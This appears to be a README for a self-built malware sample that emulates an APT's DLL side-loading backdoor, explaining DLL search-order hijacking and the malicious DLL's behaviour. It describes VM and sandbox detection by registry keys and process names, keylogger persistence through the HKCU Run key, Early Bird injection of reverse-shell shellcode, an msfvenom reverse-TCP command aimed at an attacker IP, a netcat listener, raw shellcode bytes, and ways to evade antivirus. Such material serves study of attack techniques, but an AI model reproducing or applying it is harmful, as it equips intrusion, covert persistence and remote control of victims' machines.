`gBrLogAPI.cpp` is the code for the good DLL. It has an entry point and it simply prompts a message box to the user once loaded. 

`BrLogAPI.cpp` is the code for the bad DLL that the attacker will try to side-load into the main executable. 

To compile them on windows (using mingw) run,

    g++ -shared -o <cpp_file.dll> <cpp_file.cpp>
## How will DLL hijacking work?
In a real scenario, the DLL is linked to the loader during compilation. If Safe DLL search mode is enabled (which is by default on most versions) then OS will check whether the DLL is already loaded in memory or is it a part of Known DLLs registry key located at HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlSession ManagerKnownDLLs. If OS cannot find the DLL at either of these, then DLL search starts in the following order:
```
- The directory from which the application is loaded (if that happens to be the current directory then be it)
- The system directory
- The 16-bit system directory
- The windows directory
- The current working directory
- The directories listed in the PATH environment variable
```
Thus, if an attacker manages to place a DLL in the same directory from which the application is loaded, this DLL will be used instead of the actual one. This is exlpoiting the searching order of windows.

In this case, since I've directly supplied the path of the DLL, search order highjacking doesn't make sense. So, to implement something similar, we can just remove the good DLL and place the malicious DLL instead in the same directory (we need to give them the same name).

## Explaination for BrLogAPI.cpp
Here is the complete explaination of how `BrLogAPI.cpp` works (or doesn't work). There is variable called var, which has been initialised as 1. Dependning on the value of the variable, the malware will either inject itself into a process, or create registry key value pairs.

The malicious DLL performs the following tasks:
```
a. Anti-Sandbox techniques
b. Keylogger in registry keys -- Reading the AES encrypted DIFX file
c. Shellcode process Injection -- Early Bird injection
```

We'll go over each of them one at a time.

### Anti-sandbox techniques

I have used 2 methods to check if the executable is inside a sandbox environment or a Virtual Machine. If any of the checks pass, the process quickly terminates. Ideally, there can be additional functionality given to the malware to do something else inside a sandbox thus, better effectively bypassing dynamic analysis. But for now, I have not included that, I have simply terminated the program.

##### The first method is to check for the presence of specific registry keys
    HKEY_LOCAL_MACHINE\\SOFTWARE\\Vmware Inc.\\Vmware Tools
    HKEY_LOCAL_MACHINE\\HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\\Identifier

These registry keys are found inside VMs and Sandbox Environments and thus, their presence indicates their use. The `RegOpenKeyEx()` is a win API function which returns 0 if it is able to open registries and other integers when it fails. Thus, the simple check of any of the two registries being opened (`ERROR_SUCCESS` is a pre-defined constant for 0 in win API) results in the program termination.

#### The next method is to check if specific processes are running
    Vmtoolsd.exe
    Vmwaretrat.exe
    Vmwareuser.exe
    Vmacthlp.exe
    vboxservice.exe
    vboxtray.exe
The processes listed above are found inside sandboxes and virtual machines. `IsAnyProcessRunning()` takes a snapshot of all the processes running at the time of the executable’s call and iterates over each of the processes to see if there is a match, upon which, it terminates the program.

### Registry Key manipulation

If var is set to 0, then the `keylogger` is deployed inside the `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run` registry key. What this means is, the DLL file opens this registry key, writes the executable (or test.exe in this case) to the registry key, and then closes it. This registry key is always launched (that is, its contents are run) every time the system reboots.

I use the `system()` function to execute the decryption of the `DIFX` file, then compiled the output and finally destroyed the source code. Then, using the `RegOpenKeyEx()` function I opened the specified registry key. The `KEY_WRITE` variable checks if the specified registry has writable permissions, and if it does then it returns ERROR_SUCCESS. Then I used `RegSetValueEx()` to write the exe to the registry and then closed it.

Note, that writing executables to registry keys is easily detectable via logs. Additionally, anti-malware softwares detect the use of above mentioned functions. Hence, strong obfuscation techniques are required to bypass that.

### Process Injection

Finally, I performed process injection of a windows TCP reverse shell, shell-code. The way this works is the following. The DLL initialises a variable which contains the **base64 encoded shellcode** for a windows **TCP reverse shell**. We can get the shell-code using Metasploit modules, through the following command

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=443 -f c -b \x00\x0a\x0d
We use the port `443` for communication because other ports might be blocked by the firewall. We can switch off firewall or check for valid ports (on windows) using, 

    netsh advfirewall firewall show rule dir=out name=all status=enabled

Note that the attacker public IP and the victim public IP must be different. If not, then it will be throwing a reverse shell to itself. Here is what I tried:

First, I tried to use my VMs private IP address for lhost and kept the port as 443. To catch the reverse shell, I used netcat, 'nc -lnvp 443' but the shell never came.
Then following this [link](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit/2b9fab6dc701d9a555769e14d752b3c1afb0aef1), I used my public IP for lhost but since both my windows VM and Kali VM run on the same LAN, they have the same public IP, which results in some sort of mismatch and I again don’t get the shell.
I used Metasploit as well but didn’t work, but the fault is not in the code itself, for if you switch that with this shell-code,

    \x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd6\x57\xff\xd0

Then we will get a message box saying `Hello World!`.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

This is how the DLL works. It starts functioning as soon as its loaded. The thing I haven't implemented here is encrypting the shell-code better using `FNV-1a hashing` and `LNZT1 compression`, and then decompressing it during runtime. This was to obfuscate the malicious backdoor that was used by the APT but even base64 decode works (of course any analyst with some experience in secruity will easily figure this out, but good enough for AVs static analysis).
